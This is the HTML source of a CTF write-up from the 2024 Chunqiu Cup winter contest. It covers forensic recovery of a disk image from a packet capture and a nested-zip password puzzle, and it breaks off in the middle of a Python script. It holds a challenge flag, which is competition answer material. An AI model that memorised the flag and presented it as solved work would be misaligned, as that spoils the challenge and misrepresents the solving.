@@ -1,0 +1,1065 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="overflow-y-scroll scroll-smooth"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.png"><link rel="icon" href="/favicon.png"><link rel="canonical" href="https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/"><meta name="generator" content="Astro v7.0.3"><!-- Font --><style>@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/02154cca78ac33f2.woff") format("woff"), url("/_astro/fonts/478e42e4694872ef.ttf") format("truetype");font-display:swap;font-weight:300;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/3a32a7a7a67f4f58.woff") format("woff"), url("/_astro/fonts/0863f4f6964aa89c.ttf") format("truetype");font-display:swap;font-weight:400;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/a5c5808c25effec9.woff") format("woff"), url("/_astro/fonts/792eded6cb3f0350.ttf") format("truetype");font-display:swap;font-weight:500;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/14314705006234cb.woff") format("woff"), url("/_astro/fonts/87d8fc1072d4917b.ttf") format("truetype");font-display:swap;font-weight:600;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/c33265ba093eb291.woff") format("woff"), url("/_astro/fonts/ec883ed4db81a7d9.ttf") format("truetype");font-display:swap;font-weight:700;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/c26ad40d3b1d9169.woff") format("woff"), url("/_astro/fonts/7a5ee0cfcde31b81.ttf") format("truetype");font-display:swap;font-weight:300;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/87ca066ba5b2c7cf.woff") format("woff"), url("/_astro/fonts/f4e25dfe9d6152ec.ttf") format("truetype");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/a9a0e80c053be3d5.woff") format("woff"), url("/_astro/fonts/a9df48ecd03749e4.ttf") format("truetype");font-display:swap;font-weight:500;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/da468df88542c99b.woff") format("woff"), url("/_astro/fonts/90f9809471092714.ttf") format("truetype");font-display:swap;font-weight:600;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/f914de358bc554f6.woff") format("woff"), url("/_astro/fonts/dbc9996f99c63e07.ttf") format("truetype");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:300;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:400;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:500;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:600;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:700;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:300;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:500;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:600;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:700;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}:root{--font-google-sans-code:"Google Sans Code-1a30c214885cb404","Google Sans Code-1a30c214885cb404 fallback: Courier New",monospace;}</style><!-- Primary meta --><title>2024春秋杯冬季赛-WriteUp | Syn3x&#39;s Blog</title><meta name="title" content="2024春秋杯冬季赛-WriteUp | Syn3x's Blog"><meta name="description" content="2024 春秋杯冬季赛 WriteUp，记录 MISC、Web 与密码题的分析过程、脚本思路和解题结果。"><meta name="author" content="Syn3x"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph --><meta property="og:type" content="website"><meta property="og:site_name" content="Syn3x's Blog"><meta property="og:title" content="2024春秋杯冬季赛-WriteUp | Syn3x's Blog"><meta property="og:description" content="2024 春秋杯冬季赛 WriteUp，记录 MISC、Web 与密码题的分析过程、脚本思路和解题结果。"><meta property="og:url" content="https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/"><meta property="og:image" content="https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/index.png"><!-- Twitter / X --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/"><meta property="twitter:title" content="2024春秋杯冬季赛-WriteUp | Syn3x's Blog"><meta property="twitter:description" content="2024 春秋杯冬季赛 WriteUp，记录 MISC、Web 与密码题的分析过程、脚本思路和解题结果。"><meta property="twitter:image" content="https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/index.png"><!-- RSS autodiscovery --><link rel="alternate" type="application/rss+xml" title="Syn3x's Blog" href="https://synex.space/rss.xml/"><!-- Filled at runtime by theme.ts to match the current background colour --><meta name="theme-color" content=""><!-- Extra head content injected by child layouts (e.g. JSON-LD, article meta) --><meta property="og:type" content="article"><meta property="article:published_time" content="2025-01-20T04:11:00.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"2024春秋杯冬季赛-WriteUp | Syn3x's Blog","image":"https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/index.png","datePublished":"2025-01-20T04:11:00.000Z","author":[{"@type":"Person","name":"Syn3x","url":"https://synex.space"}]}</script><!--
+      Inline FOUC-prevention script: sets data-theme on <html> before
+      the browser paints. Runs synchronously, no defer/async.
+    --><script>
+      (function () {
+        const stored = localStorage.getItem("theme");
+        const prefersDark = window.matchMedia(
+          "(prefers-color-scheme: dark)"
+        ).matches;
+        const theme = stored ?? (prefersDark ? "dark" : "light");
+        const root = document.firstElementChild;
+        root?.setAttribute("data-theme", theme);
+        root?.classList.toggle("dark", theme === "dark");
+        // Expose value so theme.ts can skip re-detection.
+        window.__theme = { value: theme };
+      })();
+    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.2i1RQzKf.js"></script><link rel="stylesheet" href="/_astro/Footer.ChjHkc0Z.css"><style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*),[data-astro-transition-scope]{animation:none!important}}
+</style><style>[data-astro-transition-scope="astro-bztu2lml-1"] { view-transition-name: ctf; }@layer astro { ::view-transition-old(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(ctf) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-2"] { view-transition-name: writeup; }@layer astro { ::view-transition-old(writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-3"] { view-transition-name: web; }@layer astro { ::view-transition-old(web) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(web) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(web) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(web) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-4"] { view-transition-name: crypto; }@layer astro { ::view-transition-old(crypto) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(crypto) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(crypto) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(crypto) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-4"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-4"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-4"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-4"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-5"] { view-transition-name: misc; }@layer astro { ::view-transition-old(misc) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(misc) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(misc) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(misc) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-5"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-5"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-5"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-5"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body class="bg-background font-app text-foreground selection:bg-accent/75 selection:text-accent-foreground flex min-h-svh flex-col"><a id="skip-to-content" href="#main-content" class="bg-background text-accent absolute inset-s-16 -top-full z-50 px-3 py-2 backdrop-blur-lg transition-all focus:top-4">Skip to content</a><header class="app-layout flex flex-col items-center justify-between sm:flex-row"><div class="border-border bg-background relative flex w-full items-baseline justify-between border-b py-4 sm:items-center sm:py-6"><a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none">Syn3x&#39;s Blog</a><nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"><button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open menu" aria-expanded="false" aria-controls="menu-items" data-label-open="Open menu" data-label-close="Close menu"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="hidden" viewBox="0 0 24 24" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" /><path d="M18 6 6 18M6 6l12 12" /></svg><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" viewBox="0 0 24 24" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" /><path d="M4 6h16M7 12h13M10 18h10" /></svg></button><ul id="menu-items" class="[&amp;&gt;li&gt;a]:hover:text-accent mt-4 hidden w-44 grid-cols-2 place-content-center gap-2 sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0 sm:[&amp;&gt;li]:h-8 [&amp;&gt;li&gt;a]:block [&amp;&gt;li&gt;a]:px-4 [&amp;&gt;li&gt;a]:py-3 [&amp;&gt;li&gt;a]:text-center [&amp;&gt;li&gt;a]:font-medium sm:[&amp;&gt;li&gt;a]:px-2 sm:[&amp;&gt;li&gt;a]:py-1"><li class="col-span-2"><a href="/posts/" class="active-nav">Posts</a></li><li class="col-span-2"><a href="/tags/">Tags</a></li><li class="col-span-2"><a href="/friends/">Friends</a></li><li class="col-span-2"><a href="/about/">About</a></li><li class="col-span-2"><a href="/archives/" title="Archives" aria-label="Archives" class="group inline-flex items-center gap-1 hover:text-accent focus-outline flex size-full justify-center p-3 sm:relative sm:size-8 sm:p-0"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="hidden sm:absolute sm:top-1/2 sm:left-1/2 sm:block sm:size-6 sm:-translate-x-1/2 sm:-translate-y-1/2" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 6a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v0a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8M10 12h4" /></svg><span class="sm:sr-only">Archives</span></a></li><li class="col-span-1 flex items-center justify-center"><a href="/search/" title="Search" aria-label="Search" class="group inline-flex items-center gap-1 hover:text-accent focus-outline relative size-8"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-1/2 left-1/2 size-6 -translate-x-1/2 -translate-y-1/2" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6" /></svg><span class="sr-only">Search</span></a></li><li class="col-span-1 flex items-center justify-center"><button id="theme-btn" class="focus-outline hover:[&amp;&gt;svg]:stroke-accent relative size-12 p-4 sm:size-8" title="Toggle theme" aria-label="auto" aria-live="polite"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-[50%] left-[50%] translate-[-50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M12 3h.393a7.5 7.5 0 0 0 7.92 12.446A9 9 0 1 1 12 2.992z" /></svg><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-[50%] left-[50%] translate-[-50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M14.828 14.828a4 4 0 1 0-5.656-5.656 4 4 0 0 0 5.656 5.656M6.343 17.657l-1.414 1.414M6.343 6.343 4.929 4.929M17.657 6.343l1.414-1.414M17.657 17.657l1.414 1.414M4 12H2M12 4V2M20 12h2M12 20v2" /></svg></button></li></ul></nav></div></header><script type="module">function e(){let e=document.querySelector(`#menu-btn`),t=document.querySelector(`#menu-items`),n=document.querySelector(`#menu-icon`),r=document.querySelector(`#close-icon`);if(!e||!t||!n||!r)return;let i=e.dataset.labelOpen??`Open menu`,a=e.dataset.labelClose??`Close menu`;e.addEventListener(`click`,()=>{let o=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,o?`false`:`true`),e.setAttribute(`aria-label`,o?i:a),t.classList.toggle(`hidden`),t.classList.toggle(`grid`),n.classList.toggle(`hidden`),r.classList.toggle(`hidden`)})}e(),document.addEventListener(`astro:after-swap`,e);</script><div class="app-layout flex items-center justify-start"><a id="back-button" href="/" class="group inline-flex items-center gap-1 hover:text-accent focus-outline hover:text-foreground/75 -ms-2 mt-8 mb-2"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 rtl:rotate-180" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m15 6-6 6 6 6" /></svg><span>Go back</span></a></div><script type="module">function e(){let e=document.querySelector(`#back-button`),t=sessionStorage.getItem(`backUrl`);t&&e&&(e.href=t)}document.addEventListener(`astro:page-load`,e),e();</script><main id="main-content" class="app-layout" data-pagefind-body><div class="xl:grid xl:grid-cols-[minmax(0,1fr)_13rem] xl:gap-x-10"><div><h1 style="view-transition-name:p-2024-u006625u0079cbu00676fu0051acu005b63u008d5b-write-up" class="text-accent inline-block text-2xl font-bold sm:text-3xl">2024春秋杯冬季赛-WriteUp</h1><div class="my-2 flex items-center gap-2"><div class="text-muted-foreground flex items-center gap-x-2"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 min-w-5.5" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M4 7a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zM16 3v4M8 3v4M4 11h16M7 14h.013M10.01 14h.005M13.01 14h.005M16.015 14h.005M13.015 17h.005M7.01 17h.005M10.01 17h.005" /></svg><time class="text-sm sm:text-base" datetime="2025-01-20T04:11:00.000Z">20 Jan, 2025</time></div><span aria-hidden="true" class="text-muted-foreground max-sm:hidden hidden">|</span></div><article id="article" class="app-prose max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg) mt-8 w-full"><h1 id="解题情况">解题情况</h1>
+<p><img src="https://static.synex.space/article/24i%E6%98%A5%E7%A7%8B%E5%86%AC%E5%AD%A3%E8%B5%9B%E6%88%90%E7%BB%A9-2.png" alt="">
+个人ID：boychai
+个人排名：159
+最终排名：<a href="https://mp.weixin.qq.com/s/Dc1X1xMZlarshTjcGaOgHg">153 还拿了一个Misc金手指，Misc排名为81</a>
+总结： 太难了，PWN有两个是有思路的，但是pwn好久没碰了就没深入解，第一天光卡在<code>ez_forensics</code>题目中了，解到mobax的配置已经拿到了，一直再想办法绕过master的密码，到现在也不知道题解。</p>
+<h1 id="misc">MISC</h1>
+<h2 id="第1天-简单镜像提取">第1天 简单镜像提取</h2>
+<p>流15中发现一个压缩包
+<img src="https://static.synex.space/article/Pasted%20image%2020250117160348.png" alt="">
+提取后拿到一个压缩包 内部有一个img文件
+<img src="https://static.synex.space/article/Pasted%20image%2020250117160426.png" alt="">
+通过R-Studio工具打开直接有一个文件
+<img src="https://static.synex.space/article/Pasted%20image%2020250117160520.png" alt="">
+恢复后
+<img src="https://static.synex.space/article/Pasted%20image%2020250117160543.png" alt="">
+flag{E7A10C15E26AA5750070EF756AAA1F7C}</p>
+<h2 id="第1天-压力大写个脚本吧">第1天 压力大，写个脚本吧</h2>
+<p>题目逻辑是压缩包中套压缩包，一共100个，每个都会提前给一个密码
+<img src="https://static.synex.space/article/Pasted%20image%2020250117183940.png" alt="">
+写脚本之后可以拿到<code>flag-hint.txt</code>内容如下
+<img src="https://static.synex.space/article/Pasted%20image%2020250117184027.png" alt="">
+估计密码加起来最终是一个png，这里通过下面脚本可以直接出最终的数据</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="python"><code><span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> zipfile</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> os</span></span>
